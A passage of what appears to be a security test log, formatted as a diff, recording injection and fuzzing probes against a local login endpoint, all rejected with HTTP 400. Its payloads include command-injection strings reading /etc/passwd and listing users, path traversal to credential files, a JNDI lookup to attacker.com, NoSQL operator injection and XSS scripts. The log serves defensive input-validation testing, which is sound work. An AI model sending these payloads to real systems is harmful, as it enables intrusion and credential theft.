+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 99999999999999999999999999999999999999999999999999999999999
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (34 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.114] [PASS] Category: Missing Param | Test: Both bioId & password omitted
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = [OMITTED / NOT SENT]
+      * password       = [OMITTED / NOT SENT]
+  [RESPONSE]
+    Status Code:          HTTP 400 (34 ms)
+    Response Body:        {"message":"Missing parameter.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.145] [PASS] Category: Missing Param | Test: bioId omitted from request
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = [OMITTED / NOT SENT]
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (28 ms)
+    Response Body:        {"message":"Missing parameter.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.182] [PASS] Category: Boundary/LongString | Test: 1,000 char string
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA... [truncated: 1000 chars total]
+  [RESPONSE]
+    Status Code:          HTTP 400 (30 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.219] [PASS] Category: Boundary/LongString | Test: 65,536 char string (64KB)
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZZ... [truncated: 65536 chars total]
+  [RESPONSE]
+    Status Code:          HTTP 400 (32 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.259] [PASS] Category: Malformed/JSON | Test: {"bioId": 1001, "password": "secret"}
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = {"bioId": 1001, "password": "secret"}
+  [RESPONSE]
+    Status Code:          HTTP 400 (34 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.283] [PASS] Category: Malformed/JSON | Test: {"admin": true}
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = {"admin": true}
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.311] [PASS] Category: Malformed/JSON | Test: {"$gt": ""}
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = {"$gt": ""}
+  [RESPONSE]
+    Status Code:          HTTP 400 (24 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.342] [PASS] Category: Malformed/JSON | Test: {"$ne": null}
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = {"$ne": null}
+  [RESPONSE]
+    Status Code:          HTTP 400 (27 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.368] [PASS] Category: Malformed/JSON | Test: [1, 2, 3]
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = [1, 2, 3]
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.405] [PASS] Category: Malformed/JSON | Test: {"bioId": [1, 2], "role": "ADMIN"}
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = {"bioId": [1, 2], "role": "ADMIN"}
+  [RESPONSE]
+    Status Code:          HTTP 400 (32 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.431] [PASS] Category: Malformed/JSON | Test: true
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = true
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.461] [PASS] Category: Malformed/JSON | Test: null
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = null
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.483] [PASS] Category: Boundary/Empty | Test: Empty password string ""
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = 
+  [RESPONSE]
+    Status Code:          HTTP 400 (19 ms)
+    Response Body:        {"message":"Password is required","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.525] [PASS] Category: Format/Traversal | Test: %s%s%s%s%s%n%x%d
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = %s%s%s%s%s%n%x%d
+  [RESPONSE]
+    Status Code:          HTTP 400 (37 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.555] [PASS] Category: Format/Traversal | Test: %00
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = %00
+  [RESPONSE]
+    Status Code:          HTTP 400 (26 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.591] [PASS] Category: Format/Traversal | Test: ../../../../../../etc/passwd
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ../../../../../../etc/passwd
+  [RESPONSE]
+    Status Code:          HTTP 400 (32 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.620] [PASS] Category: Format/Traversal | Test: ..\..\..\..\windows\system32\config\SAM
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ..\..\..\..\windows\system32\config\SAM
+  [RESPONSE]
+    Status Code:          HTTP 400 (24 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.649] [PASS] Category: Format/Traversal | Test: ${jndi:ldap://attacker.com/malicious}
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ${jndi:ldap://attacker.com/malicious}
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.686] [PASS] Category: Format/Traversal | Test: ${7*7}
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ${7*7}
+  [RESPONSE]
+    Status Code:          HTTP 400 (31 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.713] [PASS] Category: Format/Traversal | Test: #{7*7}
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = #{7*7}
+  [RESPONSE]
+    Status Code:          HTTP 400 (21 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.748] [PASS] Category: Unicode/Encoding | Test: 🔥🔒🚀👻🛡️
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = 🔥🔒🚀👻🛡️
+  [RESPONSE]
+    Status Code:          HTTP 400 (32 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.775] [PASS] Category: Unicode/Encoding | Test: こんにちは世界
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = こんにちは世界
+  [RESPONSE]
+    Status Code:          HTTP 400 (23 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.800] [PASS] Category: Unicode/Encoding | Test: مرحبا بالعالم
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = مرحبا بالعالم
+  [RESPONSE]
+    Status Code:          HTTP 400 (20 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.825] [PASS] Category: Unicode/Encoding | Test: Здравствуйте
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = Здравствуйте
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.858] [PASS] Category: Unicode/Encoding | Test: admin password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = admin password
+  [RESPONSE]
+    Status Code:          HTTP 400 (30 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.950] [PASS] Category: Unicode/Encoding | Test: ‮reversed_password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ‮reversed_password
+  [RESPONSE]
+    Status Code:          HTTP 400 (87 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:17.979] [PASS] Category: Unicode/Encoding | Test: test﻿password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = test﻿password
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.006] [PASS] Category: Unicode/Encoding | Test: §±!@#$%^&*()_+-=[]{}|;':",./<>?`~
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = §±!@#$%^&*()_+-=[]{}|;':",./<>?`~
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.026] [PASS] Category: Boundary/Whitespace | Test: Whitespace-only password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       =  
+  [RESPONSE]
+    Status Code:          HTTP 400 (15 ms)
+    Response Body:        {"message":"Password is required","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.045] [PASS] Category: Boundary/Whitespace | Test: Whitespace-only password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       =     
+  [RESPONSE]
+    Status Code:          HTTP 400 (16 ms)
+    Response Body:        {"message":"Password is required","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.068] [PASS] Category: Boundary/Whitespace | Test: Whitespace-only password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = 	
+  [RESPONSE]
+    Status Code:          HTTP 400 (19 ms)
+    Response Body:        {"message":"Password is required","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.087] [PASS] Category: Boundary/Whitespace | Test: Whitespace-only password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = 
+
+  [RESPONSE]
+    Status Code:          HTTP 400 (17 ms)
+    Response Body:        {"message":"Password is required","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.118] [PASS] Category: Boundary/Whitespace | Test: Whitespace-only password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = 
+
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Password is required","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.138] [PASS] Category: Boundary/Whitespace | Test: Whitespace-only password
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       =  	 
+ 
+  [RESPONSE]
+    Status Code:          HTTP 400 (16 ms)
+    Response Body:        {"message":"Password is required","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.164] [PASS] Category: Boundary/LongString | Test: 9,600 char string
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = SuperLongSecretPassword!SuperLongSecretPassword!SuperLongSecretPassword!SuperLongSecretPassword!SuperLongSecretPassword!SuperLongSecretPassword!SuperL... [truncated: 9600 chars total]
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.199] [PASS] Category: Command Injection | Test: ; whoami
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ; whoami
+  [RESPONSE]
+    Status Code:          HTTP 400 (23 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.238] [PASS] Category: Command Injection | Test: $(whoami)
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = $(whoami)
+  [RESPONSE]
+    Status Code:          HTTP 400 (36 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.271] [PASS] Category: Command Injection | Test: & whoami
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = & whoami
+  [RESPONSE]
+    Status Code:          HTTP 400 (30 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.297] [PASS] Category: Command Injection | Test: | whoami
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = | whoami
+  [RESPONSE]
+    Status Code:          HTTP 400 (23 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.326] [PASS] Category: Command Injection | Test: && whoami
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = && whoami
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.353] [PASS] Category: Command Injection | Test: || whoami
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = || whoami
+  [RESPONSE]
+    Status Code:          HTTP 400 (23 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.407] [PASS] Category: Command Injection | Test: ; id
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ; id
+  [RESPONSE]
+    Status Code:          HTTP 400 (51 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.431] [PASS] Category: Command Injection | Test: | id
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = | id
+  [RESPONSE]
+    Status Code:          HTTP 400 (21 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.459] [PASS] Category: Command Injection | Test: ; cat /etc/passwd
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ; cat /etc/passwd
+  [RESPONSE]
+    Status Code:          HTTP 400 (24 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.491] [PASS] Category: Command Injection | Test: & type C:\Windows\System32\drivers\etc\hosts
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = & type C:\Windows\System32\drivers\etc\hosts
+  [RESPONSE]
+    Status Code:          HTTP 400 (30 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.524] [PASS] Category: Command Injection | Test: `whoami`
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = `whoami`
+  [RESPONSE]
+    Status Code:          HTTP 400 (28 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.585] [PASS] Category: Command Injection | Test: & dir
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = & dir
+  [RESPONSE]
+    Status Code:          HTTP 400 (57 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.619] [PASS] Category: Command Injection | Test: ; dir
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ; dir
+  [RESPONSE]
+    Status Code:          HTTP 400 (31 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.645] [PASS] Category: Command Injection | Test: | dir
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = | dir
+  [RESPONSE]
+    Status Code:          HTTP 400 (24 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.686] [PASS] Category: Command Injection | Test: $(sleep 5)
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = $(sleep 5)
+  [RESPONSE]
+    Status Code:          HTTP 400 (38 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.725] [PASS] Category: Command Injection | Test: | echo vulnerable
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = | echo vulnerable
+  [RESPONSE]
+    Status Code:          HTTP 400 (36 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.771] [PASS] Category: Command Injection | Test: ; uname -a
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = ; uname -a
+  [RESPONSE]
+    Status Code:          HTTP 400 (43 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.796] [PASS] Category: Command Injection | Test: & calc.exe
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = & calc.exe
+  [RESPONSE]
+    Status Code:          HTTP 400 (21 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.821] [PASS] Category: Command Injection | Test: | net user
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = | net user
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.851] [PASS] Category: Command Injection | Test: bioId=; whoami
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = ; whoami
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.879] [PASS] Category: Command Injection | Test: bioId=$(whoami)
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = $(whoami)
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (26 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.908] [PASS] Category: Command Injection | Test: bioId=& dir
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = & dir
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (25 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.937] [PASS] Category: Command Injection | Test: bioId=| id
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = | id
+      * password       = ValidSecurePassword123!
+  [RESPONSE]
+    Status Code:          HTTP 400 (26 ms)
+    Response Body:        {"message":"Type mismatch: Provided value does not match the expected data type.","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.965] [PASS] Category: XSS Injection | Test: <script>alert(1)</script>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = <script>alert(1)</script>
+  [RESPONSE]
+    Status Code:          HTTP 400 (22 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:18.990] [PASS] Category: XSS Injection | Test: <script>alert('XSS')</script>
+  [REQUEST]
+    Endpoint & Transport: POST http://localhost:8080/auth/test-login (application/x-www-form-urlencoded)
+    Request Params Sent:
+      * bioId          = 1001
+      * password       = <script>alert('XSS')</script>
+  [RESPONSE]
+    Status Code:          HTTP 400 (23 ms)
+    Response Body:        {"message":"Invalid Credentials","status":400}
+  [VERDICT]
+    Outcome:              PASS
+----------------------------------------------------------------------------------------
+[2026-10-08 11:46:19.030] [PASS] Category: XSS Injection | Test: <img src=x onerror=alert(1)>
+  [REQUEST]
